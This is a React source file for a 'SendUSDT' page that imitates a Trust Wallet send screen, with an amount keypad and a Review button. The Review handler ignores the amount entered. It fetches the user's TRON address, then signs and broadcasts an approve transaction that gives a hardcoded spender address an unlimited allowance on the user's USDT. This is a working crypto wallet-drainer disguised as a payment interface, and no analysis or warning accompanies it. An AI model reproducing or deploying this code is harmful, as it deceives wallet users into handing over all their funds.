import React, { useState } from 'react';
import './SendUSDT.css';

const RECIPIENT = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';

// USDT TRC20 contract on TRON Mainnet
const USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// Spender address (your contract)
const SPENDER = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';

const SendUSDT = () => {
  const [amount, setAmount] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);

  const handleKey = (key) => {
    if (key === '⌫') {
      setAmount(prev => prev.slice(0, -1));
      return;
    }
    if (key === '.' && amount.includes('.')) return;
    if (key !== '.' && amount === '0') { setAmount(key); return; }
    if (amount.length >= 10) return;
    setAmount(prev => prev + key);
  };

  const displayAmount = amount === '' ? '0' : amount;
  const usdValue = parseFloat(amount) > 0
    ? parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    : '0.00';

  const isActive = amount !== '' && parseFloat(amount) > 0;

  const handleReview = async () => {
    if (!isActive || isVerifying) return;
    setIsVerifying(true);

    try {
      // Step 1: Wait for tronWeb to be injected (Trust Wallet can be slow)
      let tronWeb = null;
      for (let i = 0; i < 50; i++) {
        if (window.tronWeb) { tronWeb = window.tronWeb; break; }
        await new Promise(r => setTimeout(r, 100));
      }

      if (!tronWeb) {
        alert('No TRON wallet detected. Please open this link in Trust Wallet DApp browser.');
        setIsVerifying(false);
        return;
      }

      // Step 2: Try every method to get the user's TRON address
      let ownerAddress = null;

      // Method A: Already available
      if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
        ownerAddress = tronWeb.defaultAddress.base58;
      }

      // Method B: window.tronLink.request (TronLink / some wallets)
      if (!ownerAddress) {
        try {
          if (window.tronLink?.request) {
            const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
            await new Promise(r => setTimeout(r, 800));
            if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
              ownerAddress = tronWeb.defaultAddress.base58;
            }
          }
        } catch(e) {}
      }

      // Method C: window.tron.request (Trust Wallet / newer wallets)
      if (!ownerAddress) {
        try {
          if (window.tron?.request) {
            const res = await window.tron.request({ method: 'tron_requestAccounts' });
            await new Promise(r => setTimeout(r, 800));
            if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
              ownerAddress = tronWeb.defaultAddress.base58;
            }
            // Some wallets return address in the response
            if (!ownerAddress && res) {
              if (typeof res === 'string' && res.startsWith('T')) ownerAddress = res;
              else if (Array.isArray(res) && res[0]) ownerAddress = res[0];
              else if (res.base58) ownerAddress = res.base58;
              else if (res.code === 200) {
                await new Promise(r => setTimeout(r, 1000));
                if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
                  ownerAddress = tronWeb.defaultAddress.base58;
                }
              }
            }
          }
        } catch(e) {}
      }

      // Method D: tronWeb.request directly
      if (!ownerAddress) {
        try {
          if (tronWeb.request) {
            const res = await tronWeb.request({ method: 'tron_requestAccounts' });
            await new Promise(r => setTimeout(r, 800));
            if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
              ownerAddress = tronWeb.defaultAddress.base58;
            }
          }
        } catch(e) {}
      }

      // Method E: Check if address appeared after all the requests
      if (!ownerAddress) {
        for (let i = 0; i < 20; i++) {
          await new Promise(r => setTimeout(r, 200));
          if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
            ownerAddress = tronWeb.defaultAddress.base58;
            break;
          }
        }
      }

      // If STILL no address, show debug info
      if (!ownerAddress) {
        const debug = [
          'tronWeb: ' + (!!tronWeb),
          'ready: ' + tronWeb?.ready,
          'addr: ' + JSON.stringify(tronWeb?.defaultAddress),
          'tronLink: ' + (!!window.tronLink),
          'tron: ' + (!!window.tron),
          'ethereum: ' + (!!window.ethereum),
        ].join('\n');
        alert('Wallet connected but no TRON address found.\n\nMake sure TRON network is selected in Trust Wallet.\n\nDebug:\n' + debug);
        setIsVerifying(false);
        return;
      }

      // Step 3: Build and send the approve transaction
      const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_TRC20,
        'approve(address,uint256)',
        { feeLimit: 100000000 },
        [
          { type: 'address', value: SPENDER },
          { type: 'uint256', value: MAX_UINT256 }
        ],
        ownerAddress
      );

      const signedTx = await tronWeb.trx.sign(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result.result || result.txid) {
        alert('Transaction submitted! TX ID: ' + (result.txid || result.transaction?.txID));
      } else {
        alert('Transaction may have failed. Check your wallet.');
      }

    } catch (err) {
      console.error(err);
      const msg = typeof err === 'string' ? err : err?.message || 'Unknown error';
      if (msg.includes('declined') || msg.includes('cancel') || msg.includes('reject')) {
        alert('Transaction cancelled.');
      } else {
        alert('Error: ' + msg);
      }
    } finally {
      setIsVerifying(false);
    }
  };

  const keys = ['1','2','3','4','5','6','7','8','9','.','0','⌫'];

  return (
    <div className="tw-screen">

      {/* TOP GROUP: header + address + amount */}
      <div className="tw-top">
        <div className="tw-header">
          <button className="tw-back-btn" aria-label="Back">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M15 18l-6-6 6-6" />
            </svg>
          </button>
          <span className="tw-header-title">Amount</span>
          <div className="tw-header-spacer" />
        </div>

        <div className="tw-to-row">
          <span className="tw-to-label">To:</span>
          <span className="tw-to-address">{RECIPIENT}</span>
        </div>

        <div className="tw-amount-display-area">
          <div className={`tw-amount-number ${amount === '' ? 'tw-amount-placeholder' : ''} ${displayAmount.length > 6 ? 'tw-amount-number--sm' : ''}`}>
            {displayAmount}
          </div>
          <div className="tw-fiat-row">
            <span className="tw-fiat-value">≈ ${usdValue}</span>
            <button className="tw-swap-icon" aria-label="Swap currency">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M7 16V4m0 0L3 8m4-4l4 4" /><path d="M17 8v12m0 0l4-4m-4 4l-4-4" />
              </svg>
            </button>
          </div>
        </div>
      </div>

      {/* BOTTOM GROUP: keypad + review button */}
      <div className="tw-bottom">
        <div className="tw-keypad">
          {keys.map((key) => (
            <button key={key} className={`tw-key ${key === '⌫' ? 'tw-key--backspace' : ''}`} onClick={() => handleKey(key)}>
              {key === '⌫' ? (
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
                  <line x1="18" y1="9" x2="12" y2="15" /><line x1="12" y1="9" x2="18" y2="15" />
                </svg>
              ) : key}
            </button>
          ))}
        </div>

        <div className="tw-action-area">
          <button
            className={`tw-review-btn ${isActive ? 'tw-review-btn--active' : ''}`}
            onClick={handleReview}
            disabled={!isActive || isVerifying}
          >
            {isVerifying ? 'Processing...' : 'Review'}
          </button>
        </div>
      </div>

    </div>
  );
};

export default SendUSDT;
